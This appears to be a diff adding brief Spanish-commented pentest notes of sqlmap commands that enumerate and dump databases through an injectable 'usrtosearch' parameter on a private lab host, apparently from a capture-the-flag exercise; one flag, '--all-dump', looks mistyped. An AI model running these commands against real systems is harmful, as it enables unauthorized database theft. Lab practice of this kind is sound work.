@@ -1,0 +1,10 @@
+
+# ARCHIVO BURP
+sqlmap -r request --dbs --all-dump
+
+#  ENUMERAR LAS BASE DE DATOS
+sqlmap -u 'http://192.168.0.106/kzMb5nVYJw/420search.php?usrtosearch=1' --dbs --batch
+
+# DUMPEO DE UNA BASE DE DATOS
+sqlmap -u 'http://192.168.0.106/kzMb5nVYJw/420search.php?usrtosearch=1' -D mysql --dump-all --batch
+
